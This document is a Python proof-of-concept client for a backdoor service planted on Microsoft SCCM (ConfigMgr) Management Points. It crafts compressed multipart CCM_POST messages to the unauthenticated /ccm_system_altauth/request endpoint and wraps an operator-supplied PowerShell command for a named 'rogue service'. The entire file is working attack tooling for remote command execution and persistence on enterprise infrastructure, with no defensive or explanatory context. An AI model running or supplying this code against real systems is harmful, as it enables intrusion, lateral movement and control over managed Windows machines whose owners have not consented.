#!/usr/bin/env python3
import zlib, requests, argparse, uuid
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SCCM:

    unauth_request_endpoint = "/ccm_system_altauth/request"

    dummy_machine_id = f"UID:{uuid.uuid4()}"

    tpl_multipart = b"--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ--"


    tpl_msg = f"""<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{{LENGTH}}" Offset="0" /><CorrelationID>{{{{00000000-0000-0000-0000-000000000000}}}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{{{00000000-0000-0000-0000-000000000000}}}}</ID><Payload Type="inline"/><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo><TargetAddress>mp:[http]{{TARGET_ENDPOINT}}</TargetAddress><TargetEndpoint>{{TARGET_ENDPOINT}}</TargetEndpoint><TargetHost>{{TARGET}}</TargetHost><Timeout>60000</Timeout><SourceID>{{MACHINE_ID}}</SourceID></Msg>"""
    

    tpl_request = """<BackdoorRequest>{}</BackdoorRequest>\x00"""


    def __init__(self, target, key, cert, service_name):
        self._target = target
        self._pkey = key
        self._cert = cert
        self._service_name = service_name

    def __check_resp(self,r):
        if r.status_code == 403 and r.reason == 'Forbidden' and self._target.startswith('http://'):
            print('[!] The Management Point is configured in HTTPS only mode, please use HTTPS instead of HTTP')
        elif r.status_code == 403 and r.reason == 'Client certificate required': 
            print('[!] The Management Point requires mutual TLS authentication, please provide a client certificate trusted by the internal PKI')
        elif r.status_code == 200:
            if not len(r.content) :
               print('[!] Exploitation failed')
        else: 
            print('[?] Unknown state')


    def __ccm_post(self, path, data):
        headers = {"User-Agent": "ConfigMgr Messaging HTTP Sender", "Content-Type": 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'}
        
        #print(f">>>> HTTP Request <<<<<\n{data.decode('utf-16-le')}\n")
        r = requests.request("CCM_POST", f"{self._target}{path}", headers=headers, data=data, verify=False, cert=(self._cert, self._pkey))
        print(f">>>> Response : {r.status_code} {r.reason} <<<<<\n{r.text}\n")
        try:
            print(zlib.decompress(r.content.split(b'--aAbBcCdDv1234567890VxXyYzZ')[2].split(b'\r\n')[3]).decode('utf-16-le'))
        except:
            pass
        self.__check_resp(r)

    def __ccm_system_request(self, header, request):
        multipart_body = self.tpl_multipart % (header.encode("utf-16"), zlib.compress(request))

        # print(f">>>> Header <<<<<\n{header}\n")
        print(f">>>> Request <<<<<\n{request.decode()}\n")

        self.__ccm_post(self.unauth_request_endpoint, multipart_body)


    def run(self, cmd):
        request_body = self.tpl_request.format(cmd)
        request = b"%s\r\n" % request_body.encode('utf-16')[2:]
        header = self.tpl_msg.format(LENGTH=len(request) - 2, TARGET=self._target, TARGET_ENDPOINT=self._service_name, MACHINE_ID=self.dummy_machine_id)
        self.__ccm_system_request(header, request)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CcmMessaging Backdoor Service client (POC)")  
    parser.add_argument("-t", "--target", action="store", required=True, default=None, help="Target (http[s]://sccm-mp.local/)") 
    parser.add_argument("-k", "--key", action="store", required=False, default=None, help="Private key file for mutual TLS")
    parser.add_argument("-c", "--cert", action="store", required=False, default=None, help="Certificate file for mutual TLS")
    parser.add_argument("-s", "--service", action="store", required=True, default=None, help="Rogue service name")
    parser.add_argument("cmd",  action="store", default=None, help="PowerShell command")

    options = parser.parse_args()
    
    SCCM(options.target, options.key, options.cert, options.service).run(options.cmd)

